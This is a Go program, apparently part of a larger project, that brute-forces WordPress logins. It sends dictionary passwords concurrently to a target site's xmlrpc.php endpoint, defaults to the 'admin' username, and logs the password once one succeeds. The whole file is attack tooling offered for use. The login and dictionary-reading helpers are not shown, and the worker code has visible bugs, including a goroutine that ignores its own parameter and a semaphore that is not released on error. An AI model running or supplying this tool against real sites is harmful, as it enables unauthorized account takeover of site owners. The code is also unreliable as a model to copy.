package main

import (
	"errors"
	"flag"
	"fmt"
	"log/slog"
	"os"
)

type CommandLineArgs struct {
	Url        string
	Dict       string
	Username   string
	MaxWorkers int
}

func parseCommandlineArgs() (*CommandLineArgs, error) {
	url := flag.String("url", "", "URL to WordPress website to target (without trailing /)")
	pwdList := flag.String("dict", "./dict/dict.txt", "A text dictionary containing passwords to try")
	username := flag.String("user", "admin", "Username to brute-force")
	maxWorkers := flag.Int("routines", 10, "Maximum number of Goroutines to spawn")
	flag.Parse()

	if *url == "" {
		return nil, errors.New("website url missing.")
	}

	args := &CommandLineArgs{
		Url:        *url,
		Dict:       *pwdList,
		Username:   *username,
		MaxWorkers: *maxWorkers,
	}

	return args, nil
}

func run() error {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))
	args, err := parseCommandlineArgs()
	if err != nil {
		return err
	}

	pwdChan, err := getPasswords(args.Dict)
	if err != nil {
		return fmt.Errorf("failed to read passwords file: %w", err)
	}
	defer close(pwdChan)

	url := fmt.Sprintf("%s/xmlrpc.php", args.Url)
	results := make(chan Result)

	executor := &Executor{
		Url:        url,
		MaxWorkers: args.MaxWorkers,
		Logger:     logger,
	}
	executor.Run(args.Username, pwdChan, results)

	attempts := 1
	for {
		result := <-results
		logger.Info("num password Attempt", "attempts", attempts)
		attempts++

		if result.Success {
			fmt.Println()
			logger.Info("password Found", "password", result.Password)
			break
		}
	}

	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %s\n", err.Error())
		os.Exit(1)
	}
}

type Executor struct {
	Url        string
	Logger     *slog.Logger
	MaxWorkers int
}

func (e *Executor) Run(
	username string,
	passwords <-chan string,
	results chan<- Result,
) {
	e.Logger.Info("initiating Requests")
	sem := make(chan int, e.MaxWorkers)

	for password := range passwords {
		credentials := &Credentials{username, password}

		go func(creds *Credentials) {
			sem <- 1

			e.Logger.Info("sending out request")
			result, err := attemptLogin(e.Url, credentials)
			if err != nil {
				e.Logger.Error("failed to attempt login", "error", err.Error())
				return
			}

			results <- *result
			<-sem
		}(credentials)
	}
}
